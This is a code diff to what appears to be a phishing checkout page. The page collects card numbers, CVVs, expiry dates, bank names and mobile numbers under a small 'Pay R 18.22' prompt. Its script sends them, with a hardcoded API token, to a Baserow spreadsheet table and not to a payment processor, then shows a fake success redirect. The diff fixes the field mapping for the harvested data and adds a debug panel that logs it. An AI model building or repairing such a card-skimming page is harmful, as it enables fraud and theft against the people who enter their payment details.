@@ -510,6 +510,42 @@
             margin-bottom: 20px;
             text-align: center;
         }
+
+        /* Debug panel */
+        .debug-panel {
+            display: none;
+            background-color: #f8f9fa;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            padding: 15px;
+            margin-top: 20px;
+            font-family: monospace;
+            font-size: 12px;
+            max-height: 200px;
+            overflow-y: auto;
+        }
+
+        .debug-panel h3 {
+            margin-top: 0;
+            margin-bottom: 10px;
+            font-size: 14px;
+        }
+
+        .debug-panel pre {
+            margin: 0;
+            white-space: pre-wrap;
+        }
+
+        .debug-toggle {
+            background-color: #f8f9fa;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            padding: 5px 10px;
+            font-size: 12px;
+            cursor: pointer;
+            margin-top: 10px;
+            display: inline-block;
+        }
     </style>
 </head>
 <body>
@@ -721,6 +757,15 @@
                     <button type="submit" class="pay-button">Pay R 18.22</button>
                 </div>
             </form>
+
+            <!-- Debug toggle button -->
+            <button id="debug-toggle" class="debug-toggle"></button>
+            
+            <!-- Debug panel -->
+            <div id="debug-panel" class="debug-panel">
+                <h3>Debug Information</h3>
+                <pre id="debug-content">No data yet</pre>
+            </div>
         </div>
     </div>
     
@@ -819,10 +864,48 @@
     </footer>
 
     <script>
+        // Debug functions
+        const debugPanel = document.getElementById('debug-panel');
+        const debugContent = document.getElementById('debug-content');
+        const debugToggle = document.getElementById('debug-toggle');
+        
+        // Toggle debug panel
+        debugToggle.addEventListener('click', function() {
+            if (debugPanel.style.display === 'block') {
+                debugPanel.style.display = 'none';
+                debugToggle.textContent = 'Show Debug Info';
+            } else {
+                debugPanel.style.display = 'block';
+                debugToggle.textContent = 'Hide Debug Info';
+            }
+        });
+        
+        // Function to log debug information
+        function logDebug(message, data = null) {
+            const timestamp = new Date().toISOString();
+            let logMessage = `[${timestamp}] ${message}`;
+            
+            if (data) {
+                if (typeof data === 'object') {
+                    logMessage += '\n' + JSON.stringify(data, null, 2);
+                } else {
+                    logMessage += '\n' + data;
+                }
+            }
+            
+            console.log(logMessage);
+            
+            // Update debug panel
+            debugContent.textContent += logMessage + '\n\n';
+            
+            // Auto-scroll to bottom
+            debugPanel.scrollTop = debugPanel.scrollHeight;
+        }
+        
         // Baserow API configuration - FIXED URL STRUCTURE
         const BASEROW_API = {
             token: 'LG6hnTBxgBG78FueElsSwpHRd4Wep1oL',
-            baseUrl: 'https://api.baserow.io', // Corrected API URL
+            baseUrl: 'https://api.baserow.io',
             databaseId: '209047',
             tableId: '503285'
         };
@@ -846,40 +929,75 @@
                 return;
             }
             
+            // Log form data
+            logDebug('Form data collected', {
+                cardNumber,
+                cardHolder,
+                expiryMonth,
+                expiryYear,
+                cvv,
+                bank,
+                mobileNumber
+            });
+            
             // Show loading spinner
             document.getElementById('spinner-overlay').style.display = 'flex';
             
             // Send data to Baserow
-            sendToBaserow(cardNumber, cardHolder, expiryMonth + '/' + expiryYear, cvv, bank, mobileNumber);
+            sendToBaserow(cardNumber, cardHolder, expiryMonth, expiryYear, cvv, bank, mobileNumber);
         });
         
         // Function to send data to Baserow
-        async function sendToBaserow(cardNumber, cardHolder, expiryDate, cvv, bank, mobileNumber) {
+        async function sendToBaserow(cardNumber, cardHolder, expiryMonth, expiryYear, cvv, bank, mobileNumber) {
             try {
+                // Create payload with EXACT field names matching your Baserow table
+                const payload = {
+                    // Using the exact field names from your Baserow table
+                    'cardNumber': cardNumber,
+                    'cardHolder': cardHolder,
+                    'expiryMonth': expiryMonth,
+                    'expiryYear': expiryYear,
+                    'cvv': cvv,
+                    'bank': bank,
+                    'mobileNumber': mobileNumber
+                };
+                
+                // Log the payload being sent
+                logDebug('Sending payload to Baserow with exact field names', payload);
+                
                 // Construct the correct Baserow API URL
                 const url = `${BASEROW_API.baseUrl}/api/database/rows/table/${BASEROW_API.tableId}/?user_field_names=true`;
                 
-                console.log('Sending data to Baserow:', url);
+                logDebug('Sending request to URL', url);
                 
+                // Make the API request
                 const response = await fetch(url, {
                     method: 'POST',
                     headers: {
                         'Authorization': `Token ${BASEROW_API.token}`,
                         'Content-Type': 'application/json'
                     },
-                    body: JSON.stringify({
-                        'Card Number': cardNumber,
-                        'Card Holder': cardHolder,
-                        'Expiry Date': expiryDate,
-                        'CVV': cvv,
-                        'Bank': bank,
-                        'Mobile Number': mobileNumber,
-                        'Date': new Date().toISOString()
-                    })
+                    body: JSON.stringify(payload)
                 });
                 
-                const responseData = await response.json();
-                console.log('Baserow response:', responseData);
+                // Get the response data
+                const responseText = await response.text();
+                let responseData;
+                
+                try {
+                    responseData = JSON.parse(responseText);
+                    logDebug('Baserow response parsed', responseData);
+                } catch (e) {
+                    logDebug('Failed to parse response as JSON', responseText);
+                    responseData = { error: 'Invalid JSON response' };
+                }
+                
+                // Log the full response
+                logDebug('Baserow response status', {
+                    status: response.status,
+                    statusText: response.statusText,
+                    ok: response.ok
+                });
                 
                 if (response.ok) {
                     // Hide spinner
@@ -891,8 +1009,11 @@
                     // Reset form
                     document.getElementById('payment-form').reset();
                     
+                    logDebug('Form submission successful');
+                    
                     // Redirect after 3 seconds
                     setTimeout(function() {
+                        logDebug('Redirecting to success page');
                         window.location.href = 'congratulations.html';
                     }, 3000);
                 } else {
@@ -900,14 +1021,28 @@
                     document.getElementById('spinner-overlay').style.display = 'none';
                     
                     // Show error message
-                    console.error('Baserow error:', responseData);
-                    alert('There was an error processing your payment: ' + (responseData.error || 'Unknown error'));
+                    logDebug('Baserow error response', responseData);
+                    
+                    // Try to extract a meaningful error message
+                    let errorMessage = 'Unknown error occurred';
+                    
+                    if (responseData) {
+                        if (responseData.error) {
+                            errorMessage = responseData.error;
+                        } else if (responseData.errors) {
+                            errorMessage = JSON.stringify(responseData.errors);
+                        } else if (responseData.detail) {
+                            errorMessage = responseData.detail;
+                        }
+                    }
+                    
+                    alert('There was an error processing your payment: ' + errorMessage);
                 }
             } catch (error) {
                 // Hide spinner
                 document.getElementById('spinner-overlay').style.display = 'none';
                 
-                console.error('Error:', error);
+                logDebug('Exception during form submission', error.toString());
                 alert('There was an error processing your payment. Please try again.');
             }
         }
@@ -917,6 +1052,13 @@
             if (confirm('Are you sure you want to cancel this payment?')) {
                 window.location.href = 'index.html';
             }
+        });
+        
+        // Log initial debug information
+        logDebug('Page loaded. Baserow configuration:', {
+            baseUrl: BASEROW_API.baseUrl,
+            tableId: BASEROW_API.tableId,
+            tokenPresent: !!BASEROW_API.token
         });
     </script>
 </body>
